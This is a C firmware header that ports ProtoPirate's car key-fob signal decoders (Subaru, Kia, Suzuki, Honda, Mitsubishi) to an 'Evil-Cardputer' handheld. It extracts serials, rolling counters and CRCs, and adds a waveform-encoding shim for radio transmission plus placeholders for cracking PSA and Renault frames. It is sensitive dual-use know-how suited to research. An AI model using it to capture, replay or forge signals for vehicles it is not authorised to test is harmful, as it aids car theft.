// ============================================================================
//  protopirate_port.h — Portage des décodeurs ProtoPirate sur Evil-Cardputer
// ----------------------------------------------------------------------------
//  ProtoPirate © The Pirates' Plunder / RocketGod — licence GPLv3.
//  https://protopirate.net/  (voir LICENSE dans le dépôt d'origine).
//  Ce fichier ré-implémente UNIQUEMENT le chemin de décodage (lecture des
//  trames : serial / compteur / bouton / CRC) au-dessus des primitives déjà
//  présentes dans le firmware (tpms_man_advance == manchester Flipper,
//  DURATION_DIFF, tpms_crc8). Les encodeurs / crypto à clé ne sont PAS portés.
//
//  Inclus APRÈS la définition de : SubGhzDecoded, DURATION_DIFF,
//  tpms_man_advance, tpms_crc8, MST_*/MEV_* (section CC1101 du .ino).
//  Placé dans un header => arduino-builder ne génère pas de prototypes
//  parasites (évite le bug "static extern C").
// ============================================================================
#pragma once

// ─────────────────────────── Glue SDK Flipper ──────────────────────────────
#define furi_check(x)   do{}while(0)
#define furi_assert(x)  do{}while(0)
#ifndef UNUSED
#define UNUSED(x)       ((void)(x))
#endif
#define FURI_LOG_I(...) do{}while(0)
#define FURI_LOG_E(...) do{}while(0)
#define FURI_LOG_W(...) do{}while(0)
#define FURI_LOG_D(...) do{}while(0)
#ifndef bit_read
#define bit_read(v,b)   (((v) >> (b)) & 1)
#endif

// Manchester : les valeurs d'enum Flipper (0/2/4/6/8) sont identiques à
// celles de tpms_man_advance déjà porté dans le .ino => mapping direct.
typedef uint8_t ManchesterState;
typedef uint8_t ManchesterEvent;
enum { ManchesterStateStart1 = 0, ManchesterStateMid1 = 1,
       ManchesterStateMid0 = 2,   ManchesterStateStart0 = 3 };
enum { ManchesterEventShortLow = 0, ManchesterEventShortHigh = 2,
       ManchesterEventLongLow = 4,  ManchesterEventLongHigh = 6,
       ManchesterEventReset = 8 };
static inline bool manchester_advance(ManchesterState st, ManchesterEvent ev,
                                      ManchesterState* nst, bool* data) {
    return tpms_man_advance(st, ev, nst, data);
}

// Constantes de timing d'un protocole (SubGhzBlockConst Flipper).
typedef struct {
    uint32_t te_short;
    uint32_t te_long;
    uint32_t te_delta;
    uint16_t min_count_bit_for_found;
} SubGhzBlockConst;

// Accumulateur de bits (SubGhzBlockDecoder Flipper).
typedef struct {
    uint32_t parser_step;
    uint32_t te_last;
    uint64_t decode_data;
    uint32_t decode_count_bit;
} SubGhzBlockDecoder;

// Champs génériques décodés (SubGhzBlockGeneric Flipper).
typedef struct {
    const char* protocol_name;
    uint64_t    data;
    uint64_t    data_2;
    uint32_t    serial;
    uint16_t    data_count_bit;
    uint8_t     btn;
    uint16_t    cnt;
    uint32_t    seed;
} SubGhzBlockGeneric;

struct PpDecoderBase; // fwd
typedef void (*PpRxCallback)(struct PpDecoderBase* base, void* context);
typedef struct PpDecoderBase {
    const void*  protocol;   // inutilisé ici
    PpRxCallback callback;
    void*        context;    // pointe sur le SubGhzBlockGeneric de l'instance
} SubGhzProtocolDecoderBase;

static inline void subghz_protocol_blocks_add_bit(SubGhzBlockDecoder* d, uint8_t bit) {
    d->decode_data = (d->decode_data << 1) | (uint64_t)(bit & 1);
    d->decode_count_bit++;
}

// CRC8 MSB-first (identique à subghz_protocol_blocks_crc8 Flipper).
static inline uint8_t subghz_protocol_blocks_crc8(const uint8_t* msg, size_t n,
                                                  uint8_t poly, uint8_t init) {
    return tpms_crc8(msg, (int)n, poly, init);
}
static inline uint8_t subghz_protocol_blocks_get_parity(uint64_t v, uint8_t bits) {
    uint8_t p = 0;
    for(uint8_t i = 0; i < bits; i++) p ^= (uint8_t)((v >> i) & 1);
    return p;
}
static inline uint8_t subghz_protocol_blocks_parity8(uint8_t v) {
    return subghz_protocol_blocks_get_parity(v, 8);
}
// CRC16 MSB-first (identique à subghz_protocol_blocks_crc16 Flipper).
static inline uint16_t subghz_protocol_blocks_crc16(const uint8_t* msg, size_t n,
                                                    uint16_t poly, uint16_t init) {
    uint16_t rem = init;
    for(size_t byte = 0; byte < n; ++byte) {
        rem ^= (uint16_t)msg[byte] << 8;
        for(uint8_t bit = 0; bit < 8; ++bit)
            rem = (rem & 0x8000) ? (uint16_t)((rem << 1) ^ poly) : (uint16_t)(rem << 1);
    }
    return rem;
}
#ifndef COUNT_OF
#define COUNT_OF(x) (sizeof(x) / sizeof((x)[0]))
#endif
// Prédicats de timing (protocols_common.h ProtoPirate).
static inline bool pp_is_short(uint32_t duration, const SubGhzBlockConst* t) {
    return DURATION_DIFF(duration, t->te_short) < (int32_t)t->te_delta;
}
static inline bool pp_is_long(uint32_t duration, const SubGhzBlockConst* t) {
    return DURATION_DIFF(duration, t->te_long) < (int32_t)t->te_delta;
}
// Inversion de bits d'une clé (subghz_protocol_blocks_reverse_key Flipper).
static inline uint64_t subghz_protocol_blocks_reverse_key(uint64_t key, uint8_t bit_count) {
    uint64_t reverse = 0;
    for(uint8_t i = 0; i < bit_count; i++)
        reverse |= ((key >> i) & 1ULL) << (bit_count - 1 - i);
    return reverse;
}
// Multiplicateur de compteur rolling (toujours 1 hors firmware Flipper).
static inline uint8_t furi_hal_subghz_get_rolling_counter_mult(void) { return 1; }

static inline void pp_u64_to_bytes_be(uint64_t data, uint8_t b[8]) {
    for(int i = 0; i < 8; i++) b[i] = (uint8_t)(data >> (56 - 8 * i));
}
static inline uint64_t pp_bytes_to_u64_be(const uint8_t b[8]) {
    uint64_t v = 0;
    for(int i = 0; i < 8; i++) v = (v << 8) | b[i];
    return v;
}
static inline uint8_t pp_reverse_bits8(uint8_t v) {
    v = (uint8_t)((v & 0xF0) >> 4 | (v & 0x0F) << 4);
    v = (uint8_t)((v & 0xCC) >> 2 | (v & 0x33) << 2);
    v = (uint8_t)((v & 0xAA) >> 1 | (v & 0x55) << 1);
    return v;
}

static inline ManchesterEvent pp_manchester_event(uint32_t duration, bool level,
                                                  const SubGhzBlockConst* t) {
    if(DURATION_DIFF(duration, t->te_short) < (int32_t)t->te_delta)
        return level ? ManchesterEventShortLow : ManchesterEventShortHigh;
    if(DURATION_DIFF(duration, t->te_long) < (int32_t)t->te_delta)
        return level ? ManchesterEventLongLow : ManchesterEventLongHigh;
    return ManchesterEventReset;
}

// État de crack crypto on-demand partagé (PSA, Renault V1 HITAG2, …).
enum { PP_BF_NONE = 0, PP_BF_PSA = 1, PP_BF_RENAULT_V1 = 2 };
static volatile uint8_t g_pp_bf_kind = PP_BF_NONE;  // type de crack en attente
static volatile bool    g_pp_bf_ready = false;      // une trame chiffrée attend un crack

// Résultat partagé rempli par le callback quand un décodeur aboutit.
static SubGhzDecoded pp_result;
static volatile bool pp_found = false;
static void pp_cb(SubGhzProtocolDecoderBase* base, void* ctx) {
    (void)base;
    SubGhzBlockGeneric* g = (SubGhzBlockGeneric*)ctx;
    pp_result.protocol   = g->protocol_name;
    pp_result.data       = g->data;
    pp_result.data_2     = g->data_2;
    pp_result.bit_count  = g->data_count_bit;
    pp_result.serial     = g->serial;
    pp_result.btn        = g->btn;
    pp_result.cnt        = g->cnt;
    pp_result.is_rolling = true;
    pp_result.valid      = true;
    pp_found             = true;
}

// ─────────────────────────── Shim d'ENCODAGE ───────────────────────────────
// Les encoders ProtoPirate construisent une onde en LevelDuration via la
// famille pp_emit. On fournit ces primitives ; l'UI convertit ensuite le
// LevelDuration[] en pulses int32 signés pour cc_send_raw / cc_send_raw_fsk.
typedef struct { bool level; uint32_t duration; } LevelDuration;
static inline LevelDuration level_duration_make(bool level, uint32_t us) {
    LevelDuration x; x.level = level; x.duration = us; return x;
}
static inline bool     level_duration_get_level(LevelDuration ld)    { return ld.level; }
static inline uint32_t level_duration_get_duration(LevelDuration ld) { return ld.duration; }

static inline size_t pp_emit(LevelDuration* up, size_t i, size_t cap, bool level, uint32_t us) {
    if(i < cap) up[i++] = level_duration_make(level, us);
    return i;
}
static inline size_t pp_emit_manchester_bit(LevelDuration* up, size_t i, size_t cap,
                                            bool bit_value, uint32_t te) {
    i = pp_emit(up, i, cap, bit_value, te);
    i = pp_emit(up, i, cap, !bit_value, te);
    return i;
}
static inline size_t pp_emit_byte_manchester(LevelDuration* up, size_t i, size_t cap,
                                             uint8_t value, uint32_t te) {
    for(int8_t bit = 7; bit >= 0; bit--)
        i = pp_emit_manchester_bit(up, i, cap, ((value >> bit) & 1) != 0, te);
    return i;
}
static inline size_t pp_emit_short_pairs(LevelDuration* up, size_t i, size_t cap,
                                         uint32_t te, size_t pair_count) {
    for(size_t p = 0; p < pair_count; p++) {
        i = pp_emit(up, i, cap, true, te);
        i = pp_emit(up, i, cap, false, te);
    }
    return i;
}
static inline size_t pp_emit_merge(LevelDuration* up, size_t i, size_t cap, bool level, uint32_t us) {
    if(i > 0 && level_duration_get_level(up[i - 1]) == level) {
        up[i - 1] = level_duration_make(level, level_duration_get_duration(up[i - 1]) + us);
        return i;
    }
    if(i < cap) up[i++] = level_duration_make(level, us);
    return i;
}
// Convertit une onde LevelDuration en pulses int32 signés (+ = HIGH, - = LOW)
// pour cc_send_raw / cc_send_raw_fsk du firmware. Renvoie le nombre de pulses.
static inline int pp_ld_to_pulses(const LevelDuration* up, size_t n, int32_t* pulses, int cap) {
    int k = 0;
    for(size_t i = 0; i < n && k < cap; i++) {
        int32_t d = (int32_t)up[i].duration; if(d <= 0) d = 1;
        pulses[k++] = up[i].level ? d : -d;
    }
    return k;
}

// ============================================================================
//  DÉCODEUR : Subaru  (PWM, 64 bits, préambule + gap/sync)  —  fréq 433.92
//  ProtoPirate protocols/subaru.c (GPLv3)
// ============================================================================
static const SubGhzBlockConst subaru_const = {
    .te_short = 800, .te_long = 1600, .te_delta = 200, .min_count_bit_for_found = 64 };
#define SUBARU_GAP_US  2800
#define SUBARU_SYNC_US 2800

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;
    uint16_t header_count;
    uint64_t key;
    uint32_t serial;
    uint8_t  btn;
    uint16_t cnt;
} PpDecSubaru;

enum { SubaruStepReset = 0, SubaruStepCheckPreamble, SubaruStepFoundGap,
       SubaruStepFoundSync, SubaruStepSaveDuration };

static void subaru_rotate_left_3bytes(uint8_t* b0, uint8_t* b1, uint8_t* b2, uint8_t count) {
    for(uint8_t i = 0; i < count; i++) {
        uint8_t t = *b0;
        *b0 = (uint8_t)((*b0 << 1) | (*b1 >> 7));
        *b1 = (uint8_t)((*b1 << 1) | (*b2 >> 7));
        *b2 = (uint8_t)((*b2 << 1) | (t   >> 7));
    }
}
static bool subaru_decode_fields_exact(const uint8_t* kb, uint32_t* out_serial,
                                       uint8_t* out_btn, uint16_t* out_cnt) {
    const uint8_t b0=kb[0],b1=kb[1],b2=kb[2],b3=kb[3],b4=kb[4],b5=kb[5],b6=kb[6],b7=kb[7];
    *out_btn = b0 & 0x0F;
    *out_serial = ((uint32_t)b1 << 16) | ((uint32_t)b2 << 8) | b3;
    uint8_t lo = 0;
    if((b4 & 0x40) == 0) lo |= 0x01;
    if((b4 & 0x80) == 0) lo |= 0x02;
    if((b5 & 0x01) == 0) lo |= 0x04;
    if((b5 & 0x02) == 0) lo |= 0x08;
    if((b6 & 0x01) == 0) lo |= 0x10;
    if((b6 & 0x02) == 0) lo |= 0x20;
    if((b5 & 0x40) == 0) lo |= 0x40;
    if((b5 & 0x80) == 0) lo |= 0x80;
    uint8_t reg_sh1 = (uint8_t)(((b7 & 0x0F) << 4) | (b5 & 0x0C) | ((b6 >> 6) & 0x03));
    uint8_t reg_sh2 = (uint8_t)(((b6 & 0x3C) << 2) | ((b7 >> 4) & 0x0F));
    uint8_t ser0=b3, ser1=b1, ser2=b2;
    subaru_rotate_left_3bytes(&ser0, &ser1, &ser2, (uint8_t)(4U + lo));
    uint8_t t1=(uint8_t)(ser1 ^ reg_sh1), t2=(uint8_t)(ser2 ^ reg_sh2);
    uint8_t hi = (uint8_t)((((t1&0x10)==0)?0x04:0)|(((t1&0x20)==0)?0x08:0)|
                           (((t2&0x80)==0)?0x02:0)|(((t2&0x40)==0)?0x01:0)|
                           (((t1&0x01)==0)?0x40:0)|(((t1&0x02)==0)?0x80:0)|
                           (((t2&0x08)==0)?0x20:0)|(((t2&0x04)==0)?0x10:0));
    const uint8_t local34 = ser0;
    const uint8_t x1=(uint8_t)(b1 ^ reg_sh1), x2=(uint8_t)(b2 ^ reg_sh2);
    const uint8_t reg_hi_inv=(uint8_t)(~hi);
    const uint8_t expect1=(uint8_t)(((x1 ^ (uint8_t)(reg_hi_inv<<2)) & 0x30)|
                                    ((x1 ^ (uint8_t)(reg_hi_inv>>6)) & 0x03)|
                                    ((x1 ^ (uint8_t)(~lo<<2)) & 0xCC));
    const uint8_t expect2=(uint8_t)(((x2 ^ (uint8_t)(reg_hi_inv>>2)) & 0x0C)|
                                    ((x2 ^ (uint8_t)(reg_hi_inv<<6)) & 0xC0)|
                                    ((x2 ^ (uint8_t)(~lo>>2)) & 0x33));
    const bool valid=(((uint8_t)(b1^expect1)|(uint8_t)(b2^expect2))==0) &&
                     ((uint8_t)(b0^local34)==lo);
    *out_cnt=(uint16_t)((uint16_t)hi<<8|lo);
    return valid;
}
static bool subaru_process_data(PpDecSubaru* instance) {
    if(instance->decoder.decode_count_bit < 64) return false;
    uint8_t b[8];
    pp_u64_to_bytes_be(instance->decoder.decode_data, b);
    instance->key = pp_bytes_to_u64_be(b);
    (void)subaru_decode_fields_exact(b, &instance->serial, &instance->btn, &instance->cnt);
    return true;
}
static void* subaru_alloc() {
    PpDecSubaru* instance = (PpDecSubaru*)calloc(1, sizeof(PpDecSubaru));
    if(!instance) return NULL;
    instance->generic.protocol_name = "Subaru";
    instance->base.callback = pp_cb;
    instance->base.context  = &instance->generic;
    return instance;
}
static void subaru_reset(void* context) {
    PpDecSubaru* instance = (PpDecSubaru*)context;
    instance->decoder.parser_step = SubaruStepReset;
}
static void subaru_feed(void* context, bool level, uint32_t duration) {
    PpDecSubaru* instance = (PpDecSubaru*)context;
    const uint32_t te_short = subaru_const.te_short;
    const uint32_t te_long  = subaru_const.te_long;
    const uint32_t te_delta = subaru_const.te_delta;
    switch(instance->decoder.parser_step) {
    case SubaruStepReset:
        if(level && (DURATION_DIFF(duration, te_long) < (int32_t)te_delta)) {
            instance->decoder.decode_data = 0;
            instance->decoder.decode_count_bit = 0;
            instance->header_count = 0;
            instance->decoder.te_last = duration;
            instance->decoder.parser_step = SubaruStepCheckPreamble;
        }
        break;
    case SubaruStepCheckPreamble:
        if(level) break;
        if((DURATION_DIFF(duration, te_long) < (int32_t)te_delta) &&
           (DURATION_DIFF(instance->decoder.te_last, te_long) < (int32_t)te_delta)) {
            instance->header_count++;
            break;
        }
        if((instance->header_count >= 0x15) && (DURATION_DIFF(duration, SUBARU_GAP_US) < 800)) {
            instance->decoder.te_last = duration;
            instance->decoder.parser_step = SubaruStepFoundGap;
        } else {
            instance->decoder.parser_step = SubaruStepReset;
        }
        break;
    case SubaruStepFoundGap:
        if(level && (DURATION_DIFF(duration, SUBARU_SYNC_US) < 800) &&
           (DURATION_DIFF(instance->decoder.te_last, SUBARU_GAP_US) < 800)) {
            instance->decoder.parser_step = SubaruStepFoundSync;
        } else {
            instance->decoder.parser_step = SubaruStepReset;
        }
        break;
    case SubaruStepFoundSync:
        if(!level && ((DURATION_DIFF(duration, te_long) < (int32_t)te_delta) ||
                      (DURATION_DIFF(duration, te_short) < (int32_t)te_delta))) {
            instance->decoder.te_last = duration;
            instance->decoder.parser_step = SubaruStepSaveDuration;
        } else {
            instance->decoder.parser_step = SubaruStepReset;
        }
        break;
    case SubaruStepSaveDuration: {
        uint8_t next_step = SubaruStepReset;
        bool bit = false, valid = false;
        if(level) {
            if(DURATION_DIFF(duration, te_long) < (int32_t)te_delta) {
                if(DURATION_DIFF(instance->decoder.te_last, te_short) < (int32_t)te_delta) { bit=false; valid=true; }
            } else if(DURATION_DIFF(duration, te_short) < (int32_t)te_delta) {
                if(DURATION_DIFF(instance->decoder.te_last, te_long) < (int32_t)te_delta) { bit=true; valid=true; }
            }
            if(valid) { subghz_protocol_blocks_add_bit(&instance->decoder, bit); next_step = SubaruStepFoundSync; }
        }
        instance->decoder.parser_step = next_step;
        if((instance->decoder.decode_count_bit >= 64) && (instance->decoder.decode_count_bit <= 80)) {
            instance->generic.data_count_bit = instance->decoder.decode_count_bit;
            instance->generic.data = instance->decoder.decode_data;
            if(subaru_process_data(instance)) {
                instance->generic.serial = instance->serial;
                instance->generic.btn = instance->btn;
                instance->generic.cnt = instance->cnt;
            }
            if(instance->base.callback) instance->base.callback(&instance->base, instance->base.context);
            instance->decoder.decode_data = 0;
            instance->decoder.decode_count_bit = 0;
            instance->decoder.parser_step = SubaruStepReset;
        }
        break;
    }
    }
}

// ============================================================================
//  DÉCODEUR : Kia V2  (Manchester, 53 bits)  —  fréq 315 / 433.92
//  ProtoPirate protocols/kia_v2.c (GPLv3)
// ============================================================================
static const SubGhzBlockConst kia_v2_const = {
    .te_short = 500, .te_long = 1000, .te_delta = 150, .min_count_bit_for_found = 53 };

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;
    uint16_t header_count;
    ManchesterState manchester_state;
} PpDecKiaV2;

enum { KiaV2StepReset = 0, KiaV2StepCheckPreamble, KiaV2StepCollectRawBits };

static void* kia_v2_alloc() {
    PpDecKiaV2* instance = (PpDecKiaV2*)calloc(1, sizeof(PpDecKiaV2));
    if(!instance) return NULL;
    instance->generic.protocol_name = "Kia V2";
    instance->base.callback = pp_cb;
    instance->base.context  = &instance->generic;
    return instance;
}
static void kia_v2_reset(void* context) {
    PpDecKiaV2* instance = (PpDecKiaV2*)context;
    instance->decoder.parser_step = KiaV2StepReset;
    instance->header_count = 0;
    instance->manchester_state = ManchesterStateMid1;
    instance->decoder.decode_data = 0;
    instance->decoder.decode_count_bit = 0;
}
static void kia_v2_feed(void* context, bool level, uint32_t duration) {
    PpDecKiaV2* instance = (PpDecKiaV2*)context;
    switch(instance->decoder.parser_step) {
    case KiaV2StepReset:
        if(level && (DURATION_DIFF(duration, kia_v2_const.te_long) < (int32_t)kia_v2_const.te_delta)) {
            instance->decoder.parser_step = KiaV2StepCheckPreamble;
            instance->decoder.te_last = duration;
            instance->header_count = 0;
            manchester_advance(instance->manchester_state, ManchesterEventReset,
                               &instance->manchester_state, NULL);
        }
        break;
    case KiaV2StepCheckPreamble:
        if(level) {
            if(DURATION_DIFF(duration, kia_v2_const.te_long) < (int32_t)kia_v2_const.te_delta) {
                instance->decoder.te_last = duration;
                instance->header_count++;
            } else if(DURATION_DIFF(duration, kia_v2_const.te_short) < (int32_t)kia_v2_const.te_delta) {
                if(instance->header_count >= 100) {
                    instance->header_count = 0;
                    instance->decoder.decode_data = 0;
                    instance->decoder.decode_count_bit = 1;
                    instance->decoder.parser_step = KiaV2StepCollectRawBits;
                    subghz_protocol_blocks_add_bit(&instance->decoder, 1);
                } else {
                    instance->decoder.te_last = duration;
                }
            } else {
                instance->decoder.parser_step = KiaV2StepReset;
            }
        } else {
            if(DURATION_DIFF(duration, kia_v2_const.te_long) < (int32_t)kia_v2_const.te_delta) {
                instance->header_count++;
                instance->decoder.te_last = duration;
            } else if(DURATION_DIFF(duration, kia_v2_const.te_short) < (int32_t)kia_v2_const.te_delta) {
                instance->decoder.te_last = duration;
            } else {
                instance->decoder.parser_step = KiaV2StepReset;
            }
        }
        break;
    case KiaV2StepCollectRawBits: {
        ManchesterEvent event = pp_manchester_event(duration, level, &kia_v2_const);
        if(event == ManchesterEventReset) { instance->decoder.parser_step = KiaV2StepReset; break; }
        bool data_bit;
        if(manchester_advance(instance->manchester_state, event, &instance->manchester_state, &data_bit)) {
            instance->decoder.decode_data = (instance->decoder.decode_data << 1) | data_bit;
            instance->decoder.decode_count_bit++;
            if(instance->decoder.decode_count_bit == 53) {
                instance->generic.data = instance->decoder.decode_data;
                instance->generic.data_count_bit = instance->decoder.decode_count_bit;
                instance->generic.serial = (uint32_t)((instance->generic.data >> 20) & 0xFFFFFFFF);
                instance->generic.btn = (uint8_t)((instance->generic.data >> 16) & 0x0F);
                uint16_t raw_count = (uint16_t)((instance->generic.data >> 4) & 0xFFF);
                instance->generic.cnt = ((raw_count >> 4) | (raw_count << 8)) & 0xFFF;
                if(instance->base.callback) instance->base.callback(&instance->base, instance->base.context);
                instance->decoder.decode_data = 0;
                instance->decoder.decode_count_bit = 0;
                instance->header_count = 0;
                instance->decoder.parser_step = KiaV2StepReset;
            }
        }
        break;
    }
    }
}


// ===== fragment: pp_frag_kia.h =====
/* ============================================================================
 * Kia V0 decoder — ProtoPirate (GPLv3)
 * Handles Kia / Suzuki / Honda / Mitsubishi V0 fixed-code families.
 * ==========================================================================*/

static const SubGhzBlockConst kia_protocol_v0_const = {
    .te_short = 250,
    .te_long = 500,
    .te_delta = 100,
    .min_count_bit_for_found = 61,
};

#define KIA_V0_TYPE_KIA    1U
#define KIA_V0_TYPE_SUZUKI 2U
#define KIA_V0_TYPE_HONDA  3U
#define KIA_V0_TYPE_MITSU  4U

#define KIA_V0_BIT_COUNT_KIA    61U
#define KIA_V0_BIT_COUNT_SUZUKI 64U
#define KIA_V0_BIT_COUNT_HONDA  72U

#define KIA_V0_KIA_GAP_BASE 700U
#define KIA_V0_KIA_GAP_SPAN 1000U

#define KIA_V0_SUZUKI_GAP      2000U
#define KIA_V0_SUZUKI_GAP_SPAN 500U

#define KIA_V0_MITSU_PREAMBLE_MIN 72U
#define KIA_V0_MITSU_PREAMBLE_MAX 88U

typedef struct {
    uint32_t serial;
    uint16_t counter;
    uint8_t button;
    uint8_t crc;
    uint8_t type;
    bool crc_valid;
} KiaV0Fields;

typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;
    uint16_t packet_bit_count;
    uint16_t preamble_pairs;
    uint8_t type;
    uint64_t last_kia_data;
    bool have_last_kia;
} PpDec_kia_v0;

typedef enum {
    KiaV0DecoderStepReset = 0,
    KiaV0DecoderStepPreamble = 1,
    KiaV0DecoderStepSaveDuration = 2,
    KiaV0DecoderStepCheckDuration = 3,
} KiaV0DecoderStep;

static const uint8_t kia_v0_honda_crc_table[16] = {
    0x4A,
    0x25,
    0x96,
    0x4B,
    0xA1,
    0xD4,
    0x6A,
    0x35,
    0x9E,
    0x4F,
    0xA3,
    0xD5,
    0xEE,
    0x77,
    0xBF,
    0xDB,
};

/* Local timing predicates (built on the shim's DURATION_DIFF). */
static bool kia_v0_is_short(uint32_t d, const SubGhzBlockConst* c) {
    return DURATION_DIFF(d, c->te_short) < c->te_delta;
}
static bool kia_v0_is_long(uint32_t d, const SubGhzBlockConst* c) {
    return DURATION_DIFF(d, c->te_long) < c->te_delta;
}

static bool kia_v0_is_kia_gap(uint32_t duration) {
    return (duration >= KIA_V0_KIA_GAP_BASE) &&
           ((duration - KIA_V0_KIA_GAP_BASE) <= KIA_V0_KIA_GAP_SPAN);
}

static bool kia_v0_is_suzuki_gap_strict(uint32_t duration) {
    if(duration < KIA_V0_SUZUKI_GAP) {
        return false;
    }
    return (duration - KIA_V0_SUZUKI_GAP) <= KIA_V0_SUZUKI_GAP_SPAN;
}

#define kia_v0_crc8_poly(data, len) subghz_protocol_blocks_crc8((data), (len), 0x7F, 0x00)

static bool kia_v0_suzuki_verify_shifted_crc_words(uint32_t lo, uint32_t hi) {
    uint32_t r3 = ((lo >> 16) | (hi << 16)) & (uint32_t)~0xF0000000u;
    uint32_t r2 = (lo >> 12) & 0x0FU;
    uint32_t r1 = (hi >> 12) & 0xFFFFU;
    const uint8_t r4 = (uint8_t)((lo >> 4) & 0xFFU);

    r1 = ((r1 & 0xFFU) << 8) | ((r1 >> 8) & 0xFFU);

    uint8_t buf[6];
    buf[0] = (uint8_t)(r1 & 0xFFu);
    buf[1] = (uint8_t)((r1 >> 8) & 0xFFu);
    buf[2] = (uint8_t)((r3 >> 20) & 0xFFu);

    const uint8_t mid = (uint8_t)((r3 >> 12) & 0xFFu);
    buf[3] = mid;
    buf[4] = (uint8_t)((r3 >> 4) & 0xFFu);
    buf[5] = (uint8_t)(((r3 << 4) | (r2 & 0x0FU)) & 0xFFU);

    return (kia_v0_crc8_poly(buf, 6) == r4);
}

static bool kia_v0_suzuki_shifted_crc_valid(uint64_t shifted_key) {
    const uint32_t lo = (uint32_t)(shifted_key & 0xFFFFFFFFULL);
    const uint32_t hi = (uint32_t)((shifted_key >> 32) & 0xFFFFFFFFULL);
    return kia_v0_suzuki_verify_shifted_crc_words(lo, hi);
}

static bool kia_v0_suzuki_resolve_shifted(uint64_t decode_data, uint64_t* out_shifted) {
    if(kia_v0_suzuki_shifted_crc_valid(decode_data)) {
        *out_shifted = decode_data;
        return true;
    }
    const uint64_t from_wire = decode_data << 1U;
    if(kia_v0_suzuki_shifted_crc_valid(from_wire)) {
        *out_shifted = from_wire;
        return true;
    }
    return false;
}

static uint8_t kia_v0_calculate_crc_poly(uint64_t data) {
    uint8_t crc_data[6];
    crc_data[0] = (data >> 48) & 0xFF;
    crc_data[1] = (data >> 40) & 0xFF;
    crc_data[2] = (data >> 32) & 0xFF;
    crc_data[3] = (data >> 24) & 0xFF;
    crc_data[4] = (data >> 16) & 0xFF;
    crc_data[5] = (data >> 8) & 0xFF;
    return kia_v0_crc8_poly(crc_data, 6);
}

static bool kia_v0_verify_crc_poly(uint64_t data) {
    uint8_t received_crc = data & 0xFF;
    return (kia_v0_calculate_crc_poly(data) == received_crc);
}

static uint64_t kia_v0_honda_transform(uint64_t data) {
    uint8_t bytes[8];
    pp_u64_to_bytes_be(data, bytes);
    for(size_t index = 0; index < 8; index++) {
        bytes[index] = pp_reverse_bits8(bytes[index]);
    }
    return pp_bytes_to_u64_be(bytes);
}

static uint8_t kia_v0_family_crc(uint16_t counter, uint32_t serial, uint8_t button) {
    const uint8_t bytes[6] = {
        (uint8_t)(counter >> 8U),
        (uint8_t)counter,
        (uint8_t)(serial >> 20U),
        (uint8_t)(serial >> 12U),
        (uint8_t)(serial >> 4U),
        (uint8_t)(((serial & 0x0FU) << 4U) | (button & 0x0FU)),
    };
    uint8_t crc = 0;
    for(size_t index = 0; index < sizeof(bytes); index++) {
        crc ^= bytes[index];
    }
    return crc;
}

static uint8_t kia_v0_honda_fold_counter(uint16_t counter) {
    uint8_t value = 0;
    for(size_t index = 0; index < sizeof(kia_v0_honda_crc_table); index++) {
        if((counter >> index) & 1U) {
            value ^= kia_v0_honda_crc_table[index];
        }
    }
    return value;
}

static uint8_t kia_v0_honda_crc(uint8_t header, uint16_t counter) {
    uint8_t value = kia_v0_honda_fold_counter(counter);
    switch(header) {
    case 0xAA:
        value ^= 0xA5;
        break;
    case 0x2A:
        value ^= 0x21;
        break;
    case 0x6A:
        value ^= 0x15;
        break;
    case 0xFA:
        value ^= 0x73;
        break;
    default:
        value ^= 0xC6;
        break;
    }
    return value;
}

static bool kia_v0_honda_key_valid(uint64_t key) {
    return ((key >> 60U) == 0x0FULL) && (((key >> 56U) & 0x0FULL) == 0x00ULL) &&
           (((key >> 8U) & 0x0FULL) == 0x0AULL);
}

static void kia_v0_parse_family_raw(uint64_t raw, uint8_t type, KiaV0Fields* fields) {
    fields->type = type;
    fields->serial = (type == KIA_V0_TYPE_SUZUKI) ? (uint32_t)((raw >> 16U) & 0x0FFFFFFFULL) :
                                                    (uint32_t)((raw >> 12U) & 0x0FFFFFFFULL);
    fields->button = (type == KIA_V0_TYPE_SUZUKI) ? (uint8_t)((raw >> 12U) & 0x0FU) :
                                                    (uint8_t)((raw >> 8U) & 0x0FU);
    fields->counter = (type == KIA_V0_TYPE_SUZUKI) ? (uint16_t)((raw >> 44U) & 0xFFFFU) :
                                                     (uint16_t)((raw >> 40U) & 0xFFFFU);
    fields->crc = (type == KIA_V0_TYPE_SUZUKI) ? (uint8_t)((raw >> 4U) & 0xFFU) :
                                                 (uint8_t)(raw & 0xFFU);
    if(type == KIA_V0_TYPE_SUZUKI) {
        fields->crc_valid = kia_v0_suzuki_shifted_crc_valid(raw);
    } else {
        fields->crc_valid =
            (kia_v0_family_crc(fields->counter, fields->serial, fields->button) == fields->crc);
    }
}

static void kia_v0_parse_honda_key(uint64_t key, KiaV0Fields* fields) {
    uint8_t bytes[8];
    pp_u64_to_bytes_be(key, bytes);
    fields->type = KIA_V0_TYPE_HONDA;
    fields->serial = ((uint32_t)bytes[3] << 16U) | ((uint32_t)bytes[4] << 8U) | (uint32_t)bytes[5];
    fields->counter = ((uint16_t)pp_reverse_bits8(bytes[1]) << 8U) |
                      (uint16_t)pp_reverse_bits8(bytes[2]);
    fields->button = bytes[6] >> 5U;
    fields->crc = bytes[7];
    fields->crc_valid = (kia_v0_honda_crc(bytes[6], fields->counter) == fields->crc);
}

static void kia_v0_parse_data(
    SubGhzBlockGeneric* generic,
    uint8_t type,
    KiaV0Fields* fields,
    uint16_t* packet_bit_count) {
    memset(fields, 0, sizeof(*fields));

    if(type == KIA_V0_TYPE_HONDA) {
        kia_v0_parse_honda_key(generic->data, fields);
        generic->data_count_bit = KIA_V0_BIT_COUNT_HONDA;
    } else {
        kia_v0_parse_family_raw(generic->data, type, fields);
        generic->data_count_bit = (type == KIA_V0_TYPE_SUZUKI) ? KIA_V0_BIT_COUNT_SUZUKI :
                                                                 KIA_V0_BIT_COUNT_KIA;
        if((type == KIA_V0_TYPE_KIA) || (type == KIA_V0_TYPE_MITSU)) {
            fields->crc_valid = kia_v0_verify_crc_poly(generic->data);
        }
    }

    generic->serial = fields->serial;
    generic->cnt = fields->counter;
    generic->btn = fields->button;
    if(packet_bit_count) {
        *packet_bit_count = generic->data_count_bit;
    }
}

static void kia_v0_decoder_state_clear(PpDec_kia_v0* instance) {
    instance->decoder.parser_step = KiaV0DecoderStepReset;
